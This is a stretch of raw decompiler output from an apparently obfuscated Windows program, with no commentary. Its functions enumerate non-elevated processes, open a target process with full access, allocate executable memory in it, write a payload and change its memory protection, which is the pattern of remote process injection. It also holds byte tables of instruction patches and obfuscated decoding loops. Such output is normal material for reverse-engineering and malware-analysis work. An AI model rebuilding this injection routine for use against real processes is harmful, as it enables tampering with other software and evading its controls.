  local_res18 = 0xc038;
  local_res1a = 0x90;
  local_1c0 = (void *)0x0;
  local_1b8 = (void *)0x0;
  lStack_1b0 = 0;
  local_1c8 = puStack_1d0;
  local_1c0 = (void *)FUN_14000e6b0(3);
  lVar1 = (longlong)local_1c0 + 3;
  local_1b8 = local_1c0;
  lStack_1b0 = lVar1;
  memmove(local_1c0,&local_res18,3);
  uVar2 = DAT_140a61920;
  local_1a8 = (undefined8 *)0x0;
  puStack_1a0 = (undefined8 *)0x0;
  local_198 = (undefined8 *)0x0;
  local_1b8 = (void *)lVar1;
  local_1a8 = (undefined8 *)FUN_14000e6b0(8);
  puStack_1a0 = local_1a8 + 1;
  *local_1a8 = uVar2;
  local_190 = (undefined1 *)0x0;
  local_188 = (undefined1 *)0x0;
  puStack_180 = (undefined1 *)0x0;
  local_198 = puStack_1a0;
  local_190 = (undefined1 *)FUN_14000e6b0(1);
  local_188 = local_190 + 1;
  *local_190 = 0xeb;
  uVar2 = DAT_140a61930;
  local_178 = (undefined8 *)0x0;
  puStack_170 = (undefined8 *)0x0;
  local_168 = (undefined8 *)0x0;
  puStack_180 = local_188;
  local_178 = (undefined8 *)FUN_14000e6b0(8);
  puStack_170 = local_178 + 1;
  *local_178 = uVar2;
  local_res20 = 0x9090;
  local_res22 = 0x90;
  local_160 = (void *)0x0;
  local_158 = (void *)0x0;
  lStack_150 = 0;
  local_168 = puStack_170;
  local_160 = (void *)FUN_14000e6b0(3);
  lVar1 = (longlong)local_160 + 3;
  local_158 = local_160;
  lStack_150 = lVar1;
  memmove(local_160,&local_res20,3);
  uVar2 = DAT_140a618f8;
  local_148 = (undefined8 *)0x0;
  puStack_140 = (undefined8 *)0x0;
  local_138 = (undefined8 *)0x0;
  local_158 = (void *)lVar1;
  local_148 = (undefined8 *)FUN_14000e6b0(8);
  puStack_140 = local_148 + 1;
  *local_148 = uVar2;
  local_130 = (undefined2 *)0x0;
  local_128 = (undefined2 *)0x0;
  puStack_120 = (undefined2 *)0x0;
  local_138 = puStack_140;
  local_130 = (undefined2 *)FUN_14000e6b0(2);
  local_128 = local_130 + 1;
  *local_130 = 0x9090;
  uVar2 = DAT_140a61928;
  local_118 = (undefined8 *)0x0;
  puStack_110 = (undefined8 *)0x0;
  local_108 = (undefined8 *)0x0;
  puStack_120 = local_128;
  local_118 = (undefined8 *)FUN_14000e6b0(8);
  puStack_110 = local_118 + 1;
  *local_118 = uVar2;
  local_314 = 0x9090c038;
  local_310 = 0x90;
  local_100 = (void *)0x0;
  local_f8 = (void *)0x0;
  lStack_f0 = 0;
  local_108 = puStack_110;
  local_100 = (void *)FUN_14000e6b0(5);
  lVar1 = (longlong)local_100 + 5;
  local_f8 = local_100;
  lStack_f0 = lVar1;
  memmove(local_100,&local_314,5);
  uVar2 = DAT_140a61998;
  local_e8 = (undefined8 *)0x0;
  puStack_e0 = (undefined8 *)0x0;
  local_d8 = (undefined8 *)0x0;
  local_f8 = (void *)lVar1;
  local_e8 = (undefined8 *)FUN_14000e6b0(8);
  puStack_e0 = local_e8 + 1;
  *local_e8 = uVar2;
  local_2fc = 0x90909090;
  local_2f8 = 0x9090;
  local_d0 = (void *)0x0;
  local_c8 = (void *)0x0;
  lStack_c0 = 0;
  local_d8 = puStack_e0;
  local_d0 = (void *)FUN_14000e6b0(6);
  lVar1 = (longlong)local_d0 + 6;
  local_c8 = local_d0;
  lStack_c0 = lVar1;
  memmove(local_d0,&local_2fc,6);
  uVar2 = DAT_140a61960;
  local_b8 = (undefined8 *)0x0;
  puStack_b0 = (undefined8 *)0x0;
  local_a8 = (undefined8 *)0x0;
  local_c8 = (void *)lVar1;
  local_b8 = (undefined8 *)FUN_14000e6b0(8);
  puStack_b0 = local_b8 + 1;
  *local_b8 = uVar2;
  local_318 = 0x1b2;
  local_316 = 0x90;
  local_a0 = (void *)0x0;
  local_98 = (void *)0x0;
  lStack_90 = 0;
  local_a8 = puStack_b0;
  local_a0 = (void *)FUN_14000e6b0(3);
  lVar1 = (longlong)local_a0 + 3;
  local_98 = local_a0;
  lStack_90 = lVar1;
  memmove(local_a0,&local_318,3);
  DAT_140a61970 = 0;
  DAT_140a61978 = 0;
  _DAT_140a61980 = 0;
  local_98 = (void *)lVar1;
  DAT_140a61970 = FUN_14000e6b0(0x240);
  _DAT_140a61980 = DAT_140a61970 + 0x240;
  local_38 = &DAT_140a61970;
  ppuVar6 = &local_2c8;
  local_2d0 = &DAT_140a61970;
  DAT_140a61978 = DAT_140a61970;
  local_2e0 = DAT_140a61970;
  lStack_2d8 = DAT_140a61970;
  do {
    lVar1 = lStack_2d8;
    local_30 = lStack_2d8;
    FUN_1400230f0(lStack_2d8,ppuVar6);
    FUN_14000e420(lVar1 + 0x18,ppuVar6 + 3);
    lStack_2d8 = lVar1 + 0x30;
    ppuVar6 = ppuVar6 + 6;
  } while (ppuVar6 != local_88);
  DAT_140a61978 = lStack_2d8;
  _eh_vector_destructor_iterator_(&local_2c8,0x30,0xc,FUN_14000fbe0);
  atexit((_func_5014 *)&LAB_1400533a0);
  return;
}



/* ==================================================================== */
/* FUN_140009b90 @ 140009b90 */

undefined8 * FUN_140009b90(undefined8 *param_1,longlong param_2)

{
  *param_1 = &PTR_FUN_140056e78;
  param_1[1] = 0;
  param_1[2] = 0;
  __std_exception_copy(param_2 + 8);
  return param_1;
}



/* ==================================================================== */
/* FUN_140009bf0 @ 140009bf0 */

undefined8 * FUN_140009bf0(undefined8 *param_1,ulonglong param_2)

{
  *param_1 = &PTR_FUN_140056e78;
  __std_exception_destroy(param_1 + 1);
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140009c60 @ 140009c60 */

undefined8 * FUN_140009c60(undefined8 *param_1)

{
  param_1[2] = 0;
  param_1[1] = "bad array new length";
  *param_1 = &PTR_FUN_140056eb8;
  return param_1;
}



/* ==================================================================== */
/* FUN_140009c90 @ 140009c90 */

void FUN_140009c90(void)

{
  undefined1 local_28 [40];

  FUN_140009c60(local_28);
                    /* WARNING: Subroutine does not return */
  _CxxThrowException(local_28,(ThrowInfo *)&DAT_14005a0e0);
}



/* ==================================================================== */
/* FUN_140009cb0 @ 140009cb0 */

undefined8 * FUN_140009cb0(undefined8 *param_1,longlong param_2)

{
  *param_1 = &PTR_FUN_140056e78;
  param_1[1] = 0;
  param_1[2] = 0;
  __std_exception_copy(param_2 + 8);
  *param_1 = &PTR_FUN_140056eb8;
  return param_1;
}



/* ==================================================================== */
/* FUN_140009cf0 @ 140009cf0 */

undefined8 * FUN_140009cf0(undefined8 *param_1,longlong param_2)

{
  *param_1 = &PTR_FUN_140056e78;
  param_1[1] = 0;
  param_1[2] = 0;
  __std_exception_copy(param_2 + 8);
  *param_1 = &PTR_FUN_140056e90;
  return param_1;
}



/* ==================================================================== */
/* FUN_140009d30 @ 140009d30 */

undefined8 * FUN_140009d30(undefined8 *param_1)

{
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  return param_1;
}



/* ==================================================================== */
/* FUN_140009d90 @ 140009d90 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_140009d90(longlong param_1)

{
  uint *puVar1;
  uint dwProcessId;
  int iVar2;
  BOOL BVar3;
  HANDLE hObject;
  HANDLE hProcess;
  bool bVar4;
  undefined1 auStackY_2b8 [32];
  uint local_288 [2];
  HANDLE local_280;
  int local_278;
  DWORD local_274 [3];
  undefined4 local_268;
  undefined1 local_264 [4];
  uint local_260;
  ulonglong local_28;

  local_28 = DAT_14005d040 ^ (ulonglong)auStackY_2b8;
  hObject = (HANDLE)CreateToolhelp32Snapshot(2);
  if (hObject != (HANDLE)0xffffffffffffffff) {
    memset(local_264,0,0x234);
    local_268 = 0x238;
    iVar2 = Process32FirstW(hObject,&local_268);
    dwProcessId = local_260;
    while (iVar2 != 0) {
      local_260 = dwProcessId;
      if (((dwProcessId & 0xfffffffb) != 0) &&
         (hProcess = OpenProcess(0x1000,0,dwProcessId), hProcess != (HANDLE)0x0)) {
        local_280 = (HANDLE)((ulonglong)local_280 & 0xffffffff00000000);
        BVar3 = IsWow64Process(hProcess,(PBOOL)&local_280);
        if ((BVar3 != 0) && ((int)local_280 == 0)) {
          local_280 = (HANDLE)0x0;
          BVar3 = OpenProcessToken(hProcess,8,&local_280);
          if (BVar3 != 0) {
            local_278 = 0;
            local_274[0] = 4;
            BVar3 = GetTokenInformation(local_280,TokenElevation,&local_278,4,local_274);
            bVar4 = local_278 != 0;
            CloseHandle(local_280);
            if (BVar3 != 0 && bVar4) goto LAB_140009f04;
          }
          puVar1 = *(uint **)(param_1 + 8);
          if (puVar1 == *(uint **)(param_1 + 0x10)) {
            FUN_14000e910(param_1,puVar1,local_288);
          }
          else {
            *puVar1 = dwProcessId;
            *(longlong *)(param_1 + 8) = *(longlong *)(param_1 + 8) + 4;
          }
        }
LAB_140009f04:
        CloseHandle(hProcess);
      }
      iVar2 = Process32NextW(hObject);
      dwProcessId = local_260;
    }
    CloseHandle(hObject);
  }
  return;
}



/* ==================================================================== */
/* FUN_140009f70 @ 140009f70 */

undefined8 FUN_140009f70(void)

{
  FUN_140009d90();
  return 0;
}



/* ==================================================================== */
/* FUN_140009f90 @ 140009f90 */

undefined8 * FUN_140009f90(undefined8 *param_1)

{
  *param_1 = 0;
  param_1[1] = 0;
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  FUN_140009f70(param_1);
  return param_1;
}



/* ==================================================================== */
/* FUN_140009fd0 @ 140009fd0 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

ulonglong FUN_140009fd0(DWORD param_1,undefined4 param_2,undefined8 param_3,LPCVOID param_4)

{
  byte bVar1;
  HANDLE hProcess;
  LPVOID pvVar2;
  LPVOID lpBaseAddress;
  LPVOID lpBaseAddress_00;
  byte bVar3;
  char cVar4;
  longlong lVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  ulonglong uVar9;
  byte bVar10;
  char cVar11;
  int in_stack_0067fc39;
  int in_stack_011b0cb6;
  int in_stack_011b0d43;
  int in_stack_0159c890;
  int in_stack_0159c91c;
  undefined8 in_stack_015ba90c;
  int in_stack_0161d5c4;
  undefined8 in_stack_017fc138;
  undefined1 auStackY_178 [32];
  byte local_148 [15];
  byte bStack_139;
  undefined4 local_138;
  undefined4 uStack_134;
  undefined8 local_130;
  undefined1 local_128;
  byte bStack_119;
  int local_118;
  undefined8 local_114;
  undefined8 uStack_10c;
  undefined2 local_104;
  undefined1 local_102;
  byte bStack_f9;
  int local_f8;
  undefined8 local_f4;
  undefined8 uStack_ec;
  undefined2 local_e4;
  undefined1 local_e2;
  byte bStack_d9;
  int local_d8;
  undefined8 local_d4;
  undefined8 uStack_cc;
  undefined4 local_b8;
  undefined4 local_b4;
  LPVOID local_b0;
  DWORD local_a8 [2];
  char *local_a0;
  longlong lStack_98;
  undefined8 local_90;
  LPCVOID local_88;
  longlong lStack_80;
  undefined8 local_78;
  LPCVOID local_70;
  longlong lStack_68;
  undefined8 local_60;
  ulonglong local_58;

  local_58 = DAT_14005d040 ^ (ulonglong)auStackY_178;
  if (param_4 == (LPCVOID)0x0) {
    uVar8 = local_58 & 0xffffffffffffff00;
  }
  else {
    hProcess = OpenProcess(0x1fffff,0,param_1);
    local_a0 = (char *)0x0;
    lStack_98 = 0;
    local_90 = 0;
    FUN_140009d30(&local_a0);
    FUN_14000e640(&local_a0,0xe);
    ReadProcessMemory(hProcess,param_4,local_a0,lStack_98 - (longlong)local_a0,(SIZE_T *)0x0);
    if (*local_a0 != 'L') {
      pvVar2 = (LPVOID)FUN_1400395a0(&local_a0,param_4);
      VirtualFreeEx(hProcess,pvVar2,0,0x8000);
    }
    FUN_14000e4e0(&local_a0,5,local_148);
    pvVar2 = VirtualAllocEx(hProcess,(LPVOID)0x0,0x1000,0x3000,0x40);
    if (pvVar2 != (LPVOID)0x0) {
      lpBaseAddress = VirtualAllocEx(hProcess,(LPVOID)0x0,0x10,0x3000,4);
      lpBaseAddress_00 =
           VirtualAllocEx(hProcess,(LPVOID)0x0,(DAT_140a618e0 - (longlong)DAT_140a618d8) + 0x100,
                          0x3000,0x40);
      WriteProcessMemory(hProcess,lpBaseAddress_00,DAT_140a618d8,
                         DAT_140a618e0 - (longlong)DAT_140a618d8,(SIZE_T *)0x0);
      local_b4 = 0;
      local_b8 = param_2;
      local_b0 = lpBaseAddress_00;
      WriteProcessMemory(hProcess,lpBaseAddress,&local_b8,0x10,(SIZE_T *)0x0);
      local_88 = (LPCVOID)0x0;
      lStack_80 = 0;
      local_78 = 0;
      FUN_14000e420(&local_88,param_3);
      local_138 = 0x1b1a1918;
      uStack_134 = 0x17161414;
      local_130 = 0;
      local_128 = 0;
      bVar10 = local_148[0];
LAB_14000a1c0:
      uVar7 = DAT_140a618c8;
      uVar8 = DAT_140a618d0;
LAB_14000a1d0:
      uVar6 = 0;
      uVar9 = uVar8;
LAB_14000a1d2:
      if (0x10 < uVar6) {
        in_stack_015ba90c = CONCAT44(uStack_134,local_138);
LAB_14000aa3f:
        FUN_1400393b0(&local_88,in_stack_015ba90c,lpBaseAddress);
        WriteProcessMemory(hProcess,pvVar2,local_88,lStack_80 - (longlong)local_88,(SIZE_T *)0x0);
        local_d8 = 0x4b443546;
        local_d4 = 0;
        uStack_cc = 0;
        bVar10 = local_148[0];
LAB_14000aa90:
        uVar8 = DAT_140a618c8;
        uVar7 = DAT_140a618d0;
LAB_14000aaa0:
        uVar6 = 0;
        uVar9 = uVar7;
LAB_14000aaa3:
        if (uVar6 < 0x14) {
          bVar3 = *(byte *)((longlong)local_a8 + (uVar6 - 0x30));
          cVar4 = (char)uVar6;
LAB_14000aab6:
          if (uVar6 < uVar8) goto LAB_14000b4a9;
          if (uVar9 + 1 <= uVar8) {
            if (uVar8 != uVar9 + 1) {
              if (uVar8 == uVar9 + 3) {
                bVar10 = bVar3 + cVar4 + 0x1dU + (cVar4 + 0x1dU & bVar3) * -2 + 0x35;
                goto LAB_14000b422;
              }
              if (uVar8 == uVar9 + 6) {
                bVar10 = bVar3 + (cVar4 - 0xfU) + (cVar4 - 0xfU & bVar3) * -2 + 0x69;
                goto LAB_14000b3ee;
              }
              if (uVar8 != uVar9 + 9) goto LAB_14000ab14;
              cVar11 = cVar4 + (cVar4 + 0xafU & bVar3) * -2 + -0x1a;
              goto LAB_14000b3b1;
            }
            bVar10 = bVar3 + cVar4 + 0x5fU + (cVar4 + 0x5fU & bVar3) * -2 + 0x67;
            uVar6 = uVar6 + *(byte *)((longlong)local_a8 + (uVar6 - 0x30)) + uVar9 + 1;
            goto LAB_14000aaa3;
          }
          bVar10 = bVar3 + (bVar3 & cVar4 + 0x75U) * -2 + -0x33 + cVar4 + 0x75U;
LAB_14000ab14:
          if (uVar6 < uVar9) {
            in_stack_0067fc39 = in_stack_0161d5c4;
            goto LAB_14000b4a9;
          }
          if (uVar8 < uVar9 + 0x10) {
            bVar10 = ('5' - (cVar4 + 0x99U & bVar3)) * '\x02' + cVar4 + bVar3;
          }
          else {
            if (uVar8 == uVar9 + 1) {
              bVar10 = (bVar3 + cVar4 + (cVar4 + 0x83U & bVar3) * -2) - 0x12;
              goto LAB_14000b3b4;
            }
            if (uVar8 == uVar9 + 2) {
              bVar10 = (bVar3 + cVar4 + (cVar4 + 0x57U & bVar3) * -2) - 10;
              goto LAB_14000aaa3;
            }
            if (uVar8 == uVar9 + 3) {
              bVar10 = ('=' - (cVar4 + 0x41U & bVar3)) * '\x02' + cVar4 + bVar3;
              goto LAB_14000b3ee;
            }
          }
          while( true ) {
            uVar7 = uVar9;
            if (uVar8 + uVar9 <= uVar6) break;
            while( true ) {
              do {
                uVar9 = uVar7;
                if (uVar8 == uVar9 + 1) {
                  cVar11 = ('.' - (cVar4 + 0x46U & bVar3)) * '\x02' + cVar4;
                  goto LAB_14000b3b1;
                }
                if (uVar8 == uVar9 + 0x40) {
                  bVar10 = (bVar3 + cVar4 + (cVar4 + 0x30U & bVar3) * -2) - 0x20;
                  uVar9 = uVar9 + 1;
                  goto LAB_14000aaa3;
                }
                if (uVar8 == uVar9 + 0x80) {
                  bVar10 = ('2' - (cVar4 + 0x1aU & bVar3)) * '\x02' + cVar4 + bVar3;
                  goto LAB_14000aaa3;
                }
                if (uVar8 == uVar9 + 3) {
                  bVar10 = (bVar3 + cVar4 + (cVar4 + 4U & bVar3) * -2) - 0x18;
                  goto LAB_14000b3ee;
                }
                if (uVar8 == uVar9 + 100) {
                  bVar10 = ('6' - (cVar4 - 0x12U & bVar3)) * '\x02' + cVar4 + bVar3;
                  uVar8 = uVar8 + uVar9;
                  goto LAB_14000b422;
                }
                if (uVar8 == uVar9 + 1000) {
                  bVar10 = (bVar3 + cVar4 + (cVar4 - 0x28U & bVar3) * -2) - 0x10;
                  goto LAB_14000b422;
                }
                if (uVar8 == uVar9 + 5) {
                  bVar10 = (':' - (cVar4 - 0x3eU & bVar3)) * '\x02' + cVar4 + bVar3;
                  goto LAB_14000b2f0;
                }
                if (uVar8 == uVar9 + 0x200) {
                  bVar10 = (bVar3 + cVar4 + (cVar4 + 0xacU & bVar3) * -2) - 8;
                  goto LAB_14000b313;
                }
                if (uVar8 == uVar9 + 0x1000) {
                  bVar10 = ('>' - (cVar4 + 0x96U & bVar3)) * '\x02' + cVar4 + bVar3;
                  uVar6 = uVar6 + *(byte *)((longlong)local_a8 + (uVar6 - 0x30)) + uVar9 + 1;
                  goto LAB_14000aaa3;
                }
                uVar7 = uVar9;
              } while (uVar8 == uVar9 + 8);
              uVar8 = uVar9 + 0x61;
              uVar7 = uVar9 + 0x461;
              if (uVar8 < uVar9 + 0x46a) {
                bVar10 = (bVar3 + cVar4 + (cVar4 - 0x21U & bVar3) * -2) - 0x3a;
                goto LAB_14000aa90;
              }
              if (uVar8 < uVar9 + 0x1461) {
                bVar10 = ('%' - (cVar4 - 0x37U & bVar3)) * '\x02' + cVar4 + bVar3;
                goto LAB_14000aaa0;
              }
              if (uVar8 < uVar9 + 0x4a2) {
                bVar10 = cVar4 + (cVar4 + 0xb3U & bVar3) * -2 + -0x32 + bVar3;
                uVar9 = uVar7;
                goto LAB_14000aab6;
              }
              if (uVar8 < uVar9 + 0x471) {
                bVar10 = (')' - (cVar4 + 0x9dU & bVar3)) * '\x02' + cVar4 + bVar3;
                uVar9 = uVar7;
                goto LAB_14000ab14;
              }
              if (uVar8 < uVar9 + 0x4db) break;
              if (uVar8 < uVar9 + 0x48b) {
                bVar10 = cVar4 + 0x71;
                cVar11 = '-';
                uVar9 = uVar7;
                goto LAB_14000af2e;
              }
              if (uVar8 < uVar9 + 0x489) {
                cVar11 = cVar4 + (cVar4 + 0x5bU & bVar3) * -2 + -0x22;
                uVar9 = uVar7;
                goto LAB_14000aefc;
              }
              if (uVar8 < uVar9 + 0x4bb) {
                bVar10 = cVar4 + 0x45;
                cVar11 = '1';
                uVar9 = uVar7;
                goto LAB_14000aebd;
              }
              if (uVar8 < uVar9 + 0x463) {
                bVar10 = (bVar3 + cVar4 + (cVar4 + 0x2fU & bVar3) * -2) - 0x1a;
                uVar9 = uVar7;
                goto LAB_14000aea5;
              }
              if (uVar9 + 0x4a3 <= uVar8) {
                uVar8 = uVar9 + 0x464;
                uVar7 = uVar9 + 0x465;
                if (uVar9 + 0x4c9 < uVar8) {
                  bVar10 = ('\x18' - (cVar4 + 0x78U & bVar3)) * '\x02' + cVar4 + bVar3;
                  uVar6 = uVar6 + *(byte *)((longlong)local_a8 + (uVar6 - 0x30)) + uVar7 + 1;
                  uVar9 = uVar7;
                  goto LAB_14000aaa3;
                }
                if (uVar9 + 0x467 < uVar8) {
                  bVar10 = bVar3 + cVar4 + (cVar4 + 0x62U & bVar3) * -2 + 0xb4;
                  uVar9 = uVar7;
                  goto LAB_14000b313;
                }
                if (uVar9 + 0x4a7 < uVar8) {
                  bVar10 = ('\x1c' - (cVar4 + 0x4cU & bVar3)) * '\x02' + cVar4 + bVar3;
                  uVar9 = uVar7;
                  goto LAB_14000b2f0;
                }
                if (uVar9 + 0x665 < uVar8) {
                  bVar10 = bVar3 + cVar4 + (cVar4 + 0x36U & bVar3) * -2 + 0xbc;
                  uVar9 = uVar7;
                  goto LAB_14000b422;
                }
                if (uVar9 + 0x469 < uVar8) {
                  bVar10 = (' ' - (cVar4 + 0x20U & bVar3)) * '\x02' + cVar4 + bVar3;
                  uVar8 = uVar8 + uVar7;
                  uVar9 = uVar7;
                  goto LAB_14000b422;
                }
                if (uVar9 + 0x4e5 < uVar8) {
                  bVar10 = (bVar3 + cVar4 + (cVar4 + 10U & bVar3) * -2) - 0x3c;
                  uVar9 = uVar7;
                  goto LAB_14000b3ee;
                }
                if (uVar9 + 0x865 < uVar8) {
                  bVar10 = ('$' - (cVar4 - 0xcU & bVar3)) * '\x02' + cVar4 + bVar3;
                  uVar9 = uVar7;
                  goto LAB_14000aaa3;
                }
                if (uVar9 + 0x46b < uVar8) {
                  bVar10 = (bVar3 + cVar4 + (cVar4 - 0x22U & bVar3) * -2) - 0x34;
                  uVar9 = uVar9 + 0x466;
                  goto LAB_14000aaa3;
                }
                if (uVar9 + 0x84d < uVar8) {
                  cVar11 = ('(' - (cVar4 - 0x38U & bVar3)) * '\x02' + cVar4;
                  uVar9 = uVar7;
                  goto LAB_14000b3b1;
                }
                if (uVar8 <= uVar9 + 0x4c6) {
                  uVar8 = uVar9 + 0x865;
                  uVar7 = uVar9 + 0x86e;
                }
              }
            }
            bVar10 = cVar4 + (cVar4 + 0x87U & bVar3) * -2 + -0x2a + bVar3;
            uVar9 = uVar7;
          }
          if (uVar8 < uVar9 + 3) {
            bVar10 = cVar4 + 0x75;
            cVar11 = '!';
LAB_14000af2e:
            bVar10 = (cVar11 - (bVar10 & bVar3)) * '\x02' + cVar4 + bVar3;
LAB_14000af3a:
            if (uVar8 + uVar9 == 0x41) {
              bVar10 = ('*' - (cVar4 + 0x72U & bVar3)) * '\x02' + cVar4;
LAB_14000b2f0:
              bVar1 = (cVar4 - 0x19U) + (cVar4 - 0x19U & bVar3) * -2 + -0x51 + bVar3;
              *(byte *)((longlong)local_a8 + (uVar6 - 0x30)) = bVar1;
              uVar6 = uVar6 - ((ulonglong)bVar1 + uVar9 + 1);
              uVar9 = uVar9 + 1;
LAB_14000b313:
              bVar1 = (char)uVar6 + 0x5c;
              *(byte *)((longlong)local_a8 + (uVar6 - 0x30)) =
                   ('>' - (bVar1 & bVar3)) * '\x02' + bVar1 + bVar3;
              uVar8 = uVar8 + 1;
              lVar5 = uVar6 + (-1 - uVar8);
              uVar6 = lVar5 + *(byte *)((longlong)local_a8 + lVar5 + -0x30) + uVar9 + 1;
              goto LAB_14000aaa3;
            }
            if (uVar9 + 0x61 < uVar8) {
              cVar11 = cVar4 + (cVar4 - 0x1fU & bVar3) * -2 + -0x46;
LAB_14000aefc:
              bVar10 = cVar11 + bVar3;
            }
            else {
              if (uVar8 == uVar9 + 1) {
                cVar11 = ('\x1f' - (cVar4 - 0x35U & bVar3)) * '\x02' + cVar4;
LAB_14000b3b1:
                bVar10 = cVar11 + bVar3;
                goto LAB_14000b3b4;
              }
              if (uVar8 == uVar9 + 3) {
                bVar10 = ('#' - (cVar4 + 0x9fU & bVar3)) * '\x02' + cVar4 + bVar3;
                goto LAB_14000aaa3;
              }
              if (uVar8 == uVar9 + 2) {
                bVar10 = (bVar3 + cVar4 + (cVar4 + 0x89U & bVar3) * -2) - 0x36;
                goto LAB_14000b3ee;
              }
              if (uVar8 == uVar9 + 5) {
                bVar10 = ('\'' - (cVar4 + 0x73U & bVar3)) * '\x02' + cVar4 + bVar3;
                uVar8 = uVar8 + uVar9;
                goto LAB_14000b422;
              }
              if (uVar8 == uVar9 + 4) {
                bVar10 = ('+' - (cVar4 + 0x47U & bVar3)) * '\x02' + cVar4 + bVar3;
                goto LAB_14000b2f0;
              }
            }
            if (uVar8 < 5) {
              if (uVar9 + 3 < uVar8) {
                bVar10 = cVar4 + 0x7a;
                cVar11 = '\x12';
LAB_14000aebd:
                bVar10 = (cVar11 - (bVar10 & bVar3)) * '\x02' + cVar4 + bVar3;
              }
              else {
                if (uVar8 == uVar9 + 1) {
                  bVar10 = bVar3 + cVar4 + (cVar4 + 100U & bVar3) * -2 + 0xa8;
                  uVar6 = uVar6 + *(byte *)((longlong)local_a8 + (uVar6 - 0x30)) + uVar9 + 1;
                  goto LAB_14000aaa3;
                }
                if (uVar8 == uVar9 + 3) {
                  bVar10 = bVar3 + cVar4 + (cVar4 + 0x38U & bVar3) * -2 + 0xb0;
                  goto LAB_14000b2f0;
                }
                if (uVar8 == uVar9 + 2) {
                  bVar10 = ('\x1a' - (cVar4 + 0x22U & bVar3)) * '\x02' + cVar4 + bVar3;
                  goto LAB_14000b422;
                }
                if (uVar8 == uVar9 + 2) {
                  bVar10 = bVar3 + cVar4 + (cVar4 + 0xcU & bVar3) * -2 + 0xb8;
                  uVar8 = uVar8 + uVar9;
                  goto LAB_14000b422;
                }
              }
              if (uVar9 < 0x28) {
LAB_14000aea5:
                *(byte *)((longlong)local_a8 + (uVar6 - 0x30)) = bVar10;
                uVar6 = uVar6 + 1;
                goto LAB_14000aaa3;
              }
              bVar10 = (cVar4 + (cVar4 + 0x9eU & bVar3) * -2 + bVar3) * '\x02' + 0x98;
LAB_14000b3b4:
              *(byte *)((longlong)local_a8 + (uVar6 - 0x30)) =
                   cVar4 + 0x13U + (cVar4 + 0x13U & bVar3) * -2 + '{' + bVar3;
              uVar9 = uVar9 + 1;
              goto LAB_14000aaa3;
            }
            bVar10 = (bVar3 * '\x02' + cVar4 + (cVar4 + 0x88U & bVar3) * -2) - 0x30;
          }
          else {
            if (uVar8 == uVar9 + 1) {
              bVar10 = (bVar3 + cVar4 + (cVar4 + 0x32U & bVar3) * -2) - 0x2c;
              uVar6 = uVar6 + *(byte *)((longlong)local_a8 + (uVar6 - 0x30)) + uVar9 + 1;
              goto LAB_14000aaa3;
            }
            if (uVar8 == uVar9 + 3) {
              bVar10 = (bVar3 + cVar4 + (cVar4 + 6U & bVar3) * -2) - 0x24;
              goto LAB_14000b2f0;
            }
            if (uVar8 == uVar9 + 2) {
              bVar10 = (bVar3 + cVar4 + (cVar4 - 0x26U & bVar3) * -2) - 0x1c;
              uVar8 = uVar8 + uVar9;
              goto LAB_14000b422;
            }
            if (uVar8 != uVar9 + 5) {
              if (uVar8 == uVar9 + 7) {
                bVar10 = (bVar3 + cVar4 + (cVar4 + 0xaeU & bVar3) * -2) - 0x14;
              }
              else {
                if (uVar8 != uVar9 + 2) goto LAB_14000af3a;
                bVar10 = ('8' - (cVar4 + 0x98U & bVar3)) * '\x02' + cVar4 + bVar3;
                uVar9 = uVar9 + 1;
              }
              goto LAB_14000aaa3;
            }
            bVar10 = ('4' - (cVar4 - 0x3cU & bVar3)) * '\x02' + cVar4 + bVar3;
          }
LAB_14000b3ee:
          *(byte *)((longlong)local_a8 + (uVar6 - 0x30)) =
               (cVar4 - 3U) + (cVar4 - 3U & bVar3) * -2 + '\x15' + bVar10 + bVar3;
          uVar8 = uVar8 + uVar9;
LAB_14000b422:
          uVar6 = uVar6 - bVar10;
          goto LAB_14000aaa3;
        }
        in_stack_0067fc39 = local_d8;
LAB_14000b4a9:
        VirtualProtectEx(hProcess,pvVar2,(longlong)in_stack_0067fc39,0x20,local_a8);
        local_70 = (LPCVOID)0x0;
        lStack_68 = 0;
        local_60 = 0;
        FUN_140039440(&local_70,param_4,pvVar2);
        local_118 = 0x3b380936;
        local_114 = 0;
        uStack_10c = 0;
        local_104 = 0;
        local_102 = 0;
        bVar10 = local_148[0];
LAB_14000b510:
        uVar8 = DAT_140a618c8;
        uVar7 = DAT_140a618d0;
LAB_14000b520:
        uVar6 = 0;
        uVar9 = uVar7;
LAB_14000b523:
        if (uVar6 < 0x17) {
          bVar3 = *(byte *)((longlong)local_a8 + (uVar6 - 0x70));
LAB_14000b533:
          if (uVar6 < uVar8) goto LAB_14000bf68;
          cVar4 = (char)uVar6;
          if (uVar9 + 1 <= uVar8) {
            if (uVar8 == uVar9 + 1) {
              bVar10 = (bVar3 + cVar4 + 0x75U + (cVar4 + 0x75U & bVar3) * -2) - 0x33;
              uVar6 = uVar6 + *(byte *)((longlong)local_a8 + (uVar6 - 0x70)) + uVar9 + 1;
            }
            else {
              if (uVar8 == uVar9 + 2) {
                bVar10 = bVar3 + (cVar4 - 0x3dU) + (cVar4 - 0x3dU & bVar3) * -2 + 0xab;
                goto LAB_14000beb8;
              }
              if (uVar8 == uVar9 + 2) {
                bVar10 = bVar3 + cVar4 + 0xadU + (cVar4 + 0xadU & bVar3) * -2 + 0x45;
                goto LAB_14000be87;
              }
              if (uVar8 == uVar9 + 3) {
                bVar10 = bVar3 + (cVar4 - 5U) + (cVar4 - 5U & bVar3) * -2 + 0x23;
                goto LAB_14000be56;
              }
              if (uVar8 != uVar9 + 5) goto LAB_14000b5a0;
              bVar10 = cVar4 + 0x97;
              cVar11 = ';';
LAB_14000be25:
              bVar10 = (cVar11 - (bVar10 & bVar3)) * '\x02' + cVar4 + bVar3;
              uVar9 = uVar9 + 1;
            }
            goto LAB_14000b523;
          }
          bVar10 = bVar3 + (bVar3 & cVar4 + 0x27U) * -2 + -0x11 + cVar4 + 0x27U;
LAB_14000b5a0:
          if (uVar6 < uVar9) {
            in_stack_011b0d43 = in_stack_0159c91c;
            goto LAB_14000bf68;
          }
          if (uVar9 + 0x20 <= uVar8) {
            if (uVar8 == uVar9 + 1) {
              cVar11 = cVar4 + (cVar4 + 0x81U & bVar3) * -2 + -6;
              goto LAB_14000bdf4;
            }
